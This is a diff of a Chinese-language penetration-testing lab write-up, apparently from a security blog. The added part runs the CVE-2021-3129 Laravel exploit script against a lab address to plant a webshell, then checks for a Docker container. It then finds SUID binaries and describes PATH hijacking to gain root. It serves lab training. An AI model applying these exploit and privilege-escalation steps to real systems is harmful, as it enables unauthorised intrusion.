@@ -418,21 +418,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-12-31
+                    2025-01-03
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    292
+                    2.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    10 分
                 </div>
                 
 
@@ -479,10 +479,172 @@
 
 
 
-<h1 id="二、-Laravel框架漏洞利用（81端口）"><a href="#二、-Laravel框架漏洞利用（81端口）" class="headerlink" title="二、 Laravel框架漏洞利用（81端口）"></a>二、 Laravel框架漏洞利用（81端口）</h1><h2 id="2-1-漏洞查询"><a href="#2-1-漏洞查询" class="headerlink" title="2.1 漏洞查询"></a>2.1 漏洞查询</h2><p>Laravel v8.29.0 (PHP v7.4.14)</p>
-<p>exploit-db：检索Laravel的历史漏洞，Laravel RCE CVE-2021-3129，<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49424">https://www.exploit-db.com/exploits/49424</a> 。</p>
+<h1 id="二、-Laravel-RCE-getshell"><a href="#二、-Laravel-RCE-getshell" class="headerlink" title="二、 Laravel RCE-getshell"></a>二、 Laravel RCE-getshell</h1><h2 id="2-1-漏洞查询"><a href="#2-1-漏洞查询" class="headerlink" title="2.1 漏洞查询"></a>2.1 漏洞查询</h2><p>google查询：Laravel v8.29.0 (PHP v7.4.14)相关漏洞</p>
+<p>exploit-db查询：检索Laravel的历史漏洞，Laravel RCE CVE-2021-3129，<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49424">https://www.exploit-db.com/exploits/49424</a> 。</p>
 <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2024-12-31%2016.07.53.png" style="zoom:50%;">
 
+<p>「 Laravel RCE CVE-2021-3129」<a href="https://sxksec.cn/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%EF%BC%8C%E8%BF%99%E7%AF%87%E6%98%AF%E6%9C%AC%E7%AB%99%E5%85%B3%E4%BA%8E%E8%AF%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AE%8C%E6%95%B4%E5%A4%8D%E7%8E%B0%E3%80%81%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E4%B8%8B%E9%9D%A2%E6%89%80%E7%94%A8%E5%88%B0%E7%9A%84%E5%85%B7%E4%BD%93%E7%9A%84exp%E4%B9%9F%E5%9C%A8%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%E3%80%82">https://sxksec.cn/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/，这篇是本站关于该漏洞的完整复现、分析和利用相关的文章，下面所用到的具体的exp也在这篇文章中。</a></p>
+<h2 id="2-2-漏洞检测"><a href="#2-2-漏洞检测" class="headerlink" title="2.2 漏洞检测"></a>2.2 漏洞检测</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python CVE-2021-3129.py <span class="token parameter variable">-u</span> http://192.168.43.253:81/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.13.14.png" style="zoom:50%;">
+
+<p>成功检测到CVE-2021-3129漏洞。</p>
+<h2 id="2-3-漏洞利用"><a href="#2-3-漏洞利用" class="headerlink" title="2.3 漏洞利用"></a>2.3 漏洞利用</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python CVE-2021-3129.py <span class="token parameter variable">-u</span> http://192.168.43.253:81/ <span class="token parameter variable">-e</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.14.18.png" style="zoom:50%;">
+
+<p>成功写入webshell。</p>
+<h2 id="2-4-getshell"><a href="#2-4-getshell" class="headerlink" title="2.4 getshell"></a>2.4 getshell</h2><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.15.52.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.20.47.png" style="zoom:50%;">
+
+<p>拿到一个www-data用户权限的shell。</p>
+<h2 id="2-5-判断shell所处的环境"><a href="#2-5-判断shell所处的环境" class="headerlink" title="2.5 判断shell所处的环境"></a>2.5 判断shell所处的环境</h2><p>如何判断我们获取的shell是否是容器？</p>
+<ul>
+<li>1）系统信息：Linux 8e172820ac78 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64</li>
+</ul>
+<p>判断大概是一个容器<code>8e172820ac78</code>。</p>
+<ul>
+<li>2）hostname的输出也表现为一个容器ID。</li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.25.29.png" alt="hostname输出" style="zoom:60%;">
+
+<ul>
+<li>3）<code>cat /proc/self/cgroup</code></li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.35.54.png" style="zoom:50%;">
+
+<blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/self/cgroup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> 在Linux系统中，<code>/proc/self/cgroup</code> 文件包含了当前进程（即执行 <code>cat /proc/self/cgroup</code> 命令的进程）所属的所有控制组（cgroups）的路径。这个文件可以帮助你确定当前进程是否运行在容器中，因为容器通常会有自己的cgroup配置。</p>
+<blockquote>
+<p>(<strong>www-data</strong>:14:name=) $ cat /proc/self/cgroup</p>
+<p>/bin/sh: 1: cd: can’t cd to 14:name=</p>
+<p>14:name=dsystemd:/</p>
+<p>13:name=systemd:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>12:pids:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>11:hugetlb:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>10:net_prio:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>9:perf_event:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>8:net_cls:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>7:freezer:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>6:devices:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>5:memory:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>4:blkio:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>3:cpuacct:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>2:cpu:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+<p>1:cpuset:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p>
+</blockquote>
+<p>每一行代表不同的cgroup子系统，如CPU、内存、设备等，冒号后的路径是该子系统下的具体cgroup路径。如果路径包含类似 <code>kubepods</code> 或 <code>docker</code> 这样的词汇，这通常意味着当前环境是一个容器。</p>
+<p>如果你在一个容器中执行这个命令，你可能会看到cgroup路径中包含容器ID或特定于容器的命名空间。如果你在一个普通的非容器环境中执行这个命令，你可能会看到不同的路径，或者路径可能直接指向根。</p>
+</blockquote>
+<blockquote>
+<h2 id="什么是cgroup路径？"><a href="#什么是cgroup路径？" class="headerlink" title="什么是cgroup路径？"></a>什么是cgroup路径？</h2><p>cgroup（Control Groups）是Linux内核的一个特性，用于对进程组的物理资源（如CPU、内存、磁盘I/O等）进行细粒度的控制和监控。cgroup路径是指在cgroup文件系统层次结构中，特定cgroup的路径。</p>
+<p>cgroup路径的作用</p>
+<p>cgroup路径的主要作用包括：</p>
+<ol>
+<li><strong>资源限制</strong>：通过在cgroup路径中设置参数，可以限制或优先分配资源给特定的进程组。</li>
+<li><strong>资源监控</strong>：可以监控特定cgroup的资源使用情况，如CPU使用率、内存使用量等。</li>
+<li><strong>进程管理</strong>：可以将进程添加到特定的cgroup中，实现对进程的分组管理。</li>
+</ol>
+<p>cgroup是Linux容器技术（如Docker和Kubernetes）中实现资源隔离和限制的关键技术。通过cgroup，容器技术可以确保容器内的进程不会消耗过多的系统资源，从而保护宿主机和其他容器的稳定性。</p>
+</blockquote>
+<p>所以综上所述，通过CVE-2021-3129拿到一个容器中www-data用户权限的shell。</p>
+<h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><h2 id="3-1-查找具有suid权限的文件"><a href="#3-1-查找具有suid权限的文件" class="headerlink" title="3.1 查找具有suid权限的文件"></a>3.1 查找具有suid权限的文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code> 是一个在Linux系统中使用的命令，用于查找系统中具有SUID（Set User ID）权限的可执行文件。下面是命令各部分的解释：</p>
+<ul>
+<li><code>find</code>：这是Linux中用于搜索文件的命令。</li>
+<li><code>/</code>：指定搜索的起始目录，这里是根目录，意味着搜索将从根目录开始，遍历整个文件系统。</li>
+<li><code>-perm -u=s</code>：这个选项告诉<code>find</code>命令查找权限设置为用户ID（User ID）具有特殊权限的文件。<code>-u=s</code>表示文件具有SUID权限。当你在 <code>find</code> 命令中使用 <code>-perm -u=s</code> 时，你实际上是在告诉 <code>find</code> 命令去搜索所有用户权限中设置了SUID的文件。</li>
+<li><code>-type f</code>：这个选项限制搜索结果只返回文件（不包括目录）。</li>
+<li><code>2&gt;/dev/null</code>：这部分是将标准错误（stderr）重定向到<code>/dev/null</code>，这意味着任何错误信息都不会显示在终端上。</li>
+</ul>
+<p><strong>SUID权限</strong>：SUID权限允许一个程序以文件所有者的身份运行，而不是以启动该程序的用户的身份运行。这通常用于需要提升权限的程序，例如<code>passwd</code>或<code>sudo</code>。</p>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.51.27.png" style="zoom:70%;">
+
+<p>  <code>/home/jobs/shell</code>文件具有suid权限且名字比较可疑。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.56.12.png" style="zoom:50%;">
+
+<p> shell文件是一个可执行二进制程序。</p>
+<p>执行./shell文件：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.58.09.png" style="zoom:60%;">
+
+<p>发现执行了一些命令，如apache2、apache2和ps等，并且执行这些命令的时候没有用绝对路径，说明他们都能从$PATH环境变量中被找到。权限提升的思路：在/tmp目录中创建一个名称为ps但是内容为<code>/bin/bash</code>的文件，并将它的权限改成7777，然后在$PATH环境变量前添加<code>/tmp:</code>	，这样以来执行./shell程序的时候，就有限会执行<code>/bin/bash</code>，又由于shell执行的时候是root权限，因此执行/bin/bash之后也会获得一个root权限的shell。</p>
+<h2 id="3-2-反弹shell"><a href="#3-2-反弹shell" class="headerlink" title="3.2 反弹shell"></a>3.2 反弹shell</h2><p>首先通过插件市场下载<code>脚本执行</code>插件，然后加载<code>脚本执行</code>插件。</p>
